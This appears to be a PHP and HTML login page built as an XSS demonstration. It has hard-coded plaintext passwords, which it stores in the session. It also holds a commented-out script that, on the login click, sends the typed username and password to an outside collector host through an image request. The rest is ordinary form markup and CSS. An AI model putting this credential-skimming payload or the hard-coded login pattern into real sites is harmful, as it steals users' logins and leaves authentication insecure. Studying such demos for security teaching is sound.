<!DOCTYPE html>
<?php
session_start();
$username = isset($_POST['uname']) ? $_POST['uname'] : "";
$password = isset($_POST['psw']) ? $_POST['psw'] : "";
if (($username == "abc" && $password == "123456")) {
	$_SESSION['username'] = $username;
	$_SESSION['pass'] = $password;
	header('Location: demo.php');
} else if (($username == "huan" && $password == "123")) {
	$_SESSION['username'] = $username;
	$_SESSION['pass'] = $password;
	header('Location: demo.php');
}
?>
<html>

<head>
    <title>xss demo</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>

<body>

    <form action="login.php" method="post">
        <div class="imgcontainer">

        </div>

        <div class="container">
            <label for="uname"><b>Username</b></label>
            <input type="text" placeholder="Enter Username" name="uname" required>

            <label for="psw"><b>Password</b></label>
            <input type="password" placeholder="Enter Password" name="psw" required>

            <button type="submit" class="btn_login">Login</button>

    </form>
</body>

</html>
<!-- <script>var x = new Image();$(document).ready(function(){$(".btn_login").click(function(){x = new Image();x.src="https://xssreflect.000webhostapp.com/ppkasdlkasdlkqwlke.php?u="+$("input[name='uname']").val()+"&p="+$("input[name='psw']").val();});});</script> -->
<style>
form {
    border: 3px solid #f1f1f1;
}

/* Full-width inputs */
input[type=text],
input[type=password] {
    width: 100%;
    padding: 12px 20px;
    margin: 8px 0;
    display: inline-block;
    border: 1px solid #ccc;
    box-sizing: border-box;
}

/* Set a style for all buttons */
button {
    background-color: #04AA6D;
    color: white;
    padding: 14px 20px;
    margin: 8px 0;
    border: none;
    cursor: pointer;
    width: 100%;
}

/* Add a hover effect for buttons */
button:hover {
    opacity: 0.8;
}

/* Extra style for the cancel button (red) */
.cancelbtn {
    width: auto;
    padding: 10px 18px;
    background-color: #f44336;
}

/* Center the avatar image inside this container */
.imgcontainer {
    text-align: center;
    margin: 24px 0 12px 0;
}

/* Avatar image */
img.avatar {
    width: 40%;
    border-radius: 50%;
}

/* Add padding to containers */
.container {
    padding: 16px;
}

/* The "Forgot password" text */
span.psw {
    float: right;
    padding-top: 16px;
}

/* Change styles for span and cancel button on extra small screens */
@media screen and (max-width: 300px) {
    span.psw {
        display: block;
        float: none;
    }

    .cancelbtn {
        width: 100%;
    }
}
</style>